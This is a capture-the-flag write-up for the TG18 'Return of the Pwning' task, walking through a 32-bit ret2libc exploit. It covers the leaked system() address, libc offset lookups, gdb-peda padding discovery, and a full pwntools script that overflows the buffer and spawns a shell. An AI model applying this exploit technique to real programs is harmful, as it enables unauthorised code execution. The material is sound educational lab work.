# Writeup [Return of the Pwning](./README.md)

First, we see some hints in both the title of the task and the URL provided. Both mention `return`, which may be a sign that you should use Return Oriented Programming (ROP) to solve this task. 

Now, let's check out what happens testing the task using Netcat:

```
nc return.tghack.no 1310
```

Which outputs the following:
```
system: 0xf75bc940
   .-'''-.      ,-----.         _______    .-./`)     ____       .---.                   
  / _     \   .'  .-,  '.      /   __  \   \ .-.')  .'  __ `.    | ,_|                   
 (`' )/`--'  / ,-.|  \ _ \    | ,_/  \__)  / `-' \ /   '  \  \ ,-./  )                   
(_ o _).    ;  \  '_ /  | : ,-./  )         `-'`"` |___|  /  | \  '_ '`)                 
 (_,_). '.  |  _`,/ \ _/  | \  '_ '`)       .---.     _.-`   |  > (_)  )                 
.---.  \  : : (  '\_/ \   ;  > (_)  )  __   |   |  .'   _    | (  .  .-'                 
\    `-'  |  \ `"/  \  ) /  (  .  .-'_/  )  |   |  |  _( )_  |  `-'`-'|___               
 \       /    '. \_/``".'    `-'`-'     /   |   |  \ (_ o _) /   |        \              
  `-...-'       '-----'        `._____.'    '---'   '.(_,_).'    `--------`              
                                                                                         
.-------.         .-''-.      ____       .---.      .-./`)  ,---------.     ____     __  
|  _ _   \      .'_ _   \   .'  __ `.    | ,_|      \ .-.') \          \    \   \   /  / 
| ( ' )  |     / ( ` )   ' /   '  \  \ ,-./  )      / `-' \  `--.  ,---'     \  _. /  '  
|(_ o _) /    . (_ o _)  | |___|  /  | \  '_ '`)     `-'`"`     |   \         _( )_ .'   
| (_,_).' __  |  (_,_)___|    _.-`   |  > (_)  )     .---.      :_ _:     ___(_ o _)'    
|  |\ \  |  | '  \   .---. .'   _    | (  .  .-'     |   |      (_I_)    |   |(_,_)'     
|  | \ `'   /  \  `-'    / |  _( )_  |  `-'`-'|___   |   |     (_(=)_)   |   `-'  /      
|  |  \    /    \       /  \ (_ o _) /   |        \  |   |      (_I_)     \      /       
''-'   `'-'      `'-..-'    '.(_,_).'    `--------`  '---'      '---'      `-..-'        
By maritio_o *\(^_^)/*
```

There is a huge hint at the top of the output, which seems to output the address to `system`. You may verify that this is the address to `system` by writing `p system` into gdb-peda.
It is provided in the output to act as an information leak. All the other output is only there to make it look pretty.

> System is a function that may be used to run commands. It is not uncommon that pwn tasks use `system` to spawn a shell. 

We need three things in order to solve this task:
1. The libc version
2. The offset to `/bin/sh`
3. The offset to `system`

Thankfully, the libc version is provided to us in the task description. We can download the binary and use this to find the required offsets. 

As an aside, it can be useful to find the libc version used when running a binary locally if 
the local version of libc doesn't match the one used remotely. 
You have to download the libc version from you environment if you want to try out the task on your own machine. 
Fetch the libc version by using the following commands:
```
$ ldd ./rop32
	linux-gate.so.1 =>  (0xf77cf000)
	libdl.so.2 => /lib32/libdl.so.2 (0xf77a8000)
	libc.so.6 => /lib32/libc.so.6 (0xf75f4000)
	/lib/ld-linux.so.2 (0x5657b000)

```
Here, we see that the libc version is `libc.so.6`. Click [here](http://man7.org/linux/man-pages/man1/ldd.1.html) to read about the terminal comman `ldd`.

Now, we may use the libc library to find the offset to `/bin/sh`. 
We copy the library to the current folder, and then find the offset to `/bin/sh` with the following commands:
```sh
$ cp /lib32/libc.so.6 .
$ strings -t x libc.so.6 | grep /bin/sh 
 15900b /bin/sh
```

At last, we must find the offset to `system`. You may use the following command:
```
$ nm -D libc.so.6 | grep system
0003a940 T __libc_system
00110820 T svcerr_systemerr
0003a940 W system
```
The last output line contains the offset to `system`. To read about the terminal comman `nm`, follow [this link](http://man7.org/linux/man-pages/man1/nm.1p.html).


Having this information, we may calculate the addresses we need to exploit the program. We need the libc base address, and the address to `/bin/sh/`. 
```
libc base address = system address - system offset
/bin/sh address = libc base address + /bin/sh offset
```

> You may verify the libc base address by entering `vmmap` in gdb-peda. The first libc is the libc base.

> You may verify the `/bin/sh` address by entering `x/s address` into gdb-peda, e.g. `x/s 0xf76a900b`.

When we want to run our exploit against the remote target, we simply replace the two offsets by the ones in the remote libc version.

Now that we have a plan for successful exploitation, we need to craft a payload. The payload has to contain the following:

1. padding up to the saved return address
2. address of system
3. saved return address from system, this can be anything as we're not returning back from system
4. first argument to system: pointer to `/bin/sh`

The first step is to find the correct amount of padding. `gdb-peda` makes this step easy with the `pattern_env` command:

```
gdb-peda$ pattern_env PWN 1024
gdb-peda$ r <<< `echo $PWN`
[...]
[----------------------------------registers-----------------------------------]
EAX: 0x48 ('H')
EBX: 0x0
ECX: 0xffffcfc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA")
EDX: 0x48 ('H')
ESI: 0xf7fb8000 --> 0x1b1db0
EDI: 0xf7fb8000 --> 0x1b1db0
EBP: 0x41416341 ('AcAA')
ESP: 0xffffd000 ("AAdAA3AA")
EIP: 0x48414132 ('2AAH')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x48414132
[------------------------------------stack-------------------------------------]
0000| 0xffffd000 ("AAdAA3AA")
0004| 0xffffd004 ("A3AA")
0008| 0xffffd008 --> 0x0
0012| 0xffffd00c --> 0xf7e1e637 (<__libc_start_main+247>:       add    esp,0x10)
0016| 0xffffd010 --> 0xf7fb8000 --> 0x1b1db0
0020| 0xffffd014 --> 0xf7fb8000 --> 0x1b1db0
0024| 0xffffd018 --> 0x0
0028| 0xffffd01c --> 0xf7e1e637 (<__libc_start_main+247>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x48414132 in ?? ()
gdb-peda$ patto 0x48414132
1212236082 found at offset: 60
```

The second peda command echoes the contents of the environment variable `PWN`, which was created by the `pattern_env`, command into the program's standard input. We can now verify that we can control the return address:

```
gdb-peda$ r <<< `python2 -c 'print "A"*60 + "BBBB"'`
[...]
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

The payload will look like this:
* 60 bytes of padding (e.g. A)
* address of `system()`
* 4 bytes of padding
* address of `/bin/sh`

Here is a solve script with all these pieces of information:
```python
from pwn import *

debug = True 
if debug == True:
    r = process("./rop32")
    # uncomment if using ssh
    #context(terminal = ["tmux", "splitw"])
    gdb.attach(r, """
        c
        """)
else:
    r = remote("localhost", 1337)

r.recvuntil("system:")
sys_address = r.recvline()[:-1] #strip last char (new line)
sys_address = int(sys_address, 16)

log.info("System: {}".format(hex(sys_address)))
# You may verify that the address is really system by writing 'p system' into gdb-peda

# Find offset to '/bin/sh'
# Find the libc version on the computer: ldd ./rop32  
# Copy to your current folder. E.g.: cp /lib32/libc.so.6 .   
# Find '/bin/sh': strings -t x libc.so.6 | grep "/bin/sh" -> 15900b /bin/sh
bin_sh_offset = 0x15900b

# Find offset to 'system': nm -D libc.so.6 | grep system -> 0003a940 W system
system_offset = 0x0003a940

# Find libc base
libc_base = sys_address - system_offset
log.info("libc base: {}".format(hex(libc_base)))
# Verify libc base by: 'vmmap' in gdb-peda. Always check the first libc for libc base

bin_sh_address = libc_base + bin_sh_offset
log.info("/bin/sh address: {}".format(hex(bin_sh_address)))
# Verify /bin/sh address by 'x/s address' in gdb-peda -> 0xf76a900b:	"/bin/sh"

payload = p32(sys_address) + "BBBB" + p32(bin_sh_address)
r.sendline("A"*60 + payload)

r.interactive()

```

Run the script, and then... Whoop whoop, I got the flag!

```
TG18{ROPropROPROPrOpRoPRopROp}
```
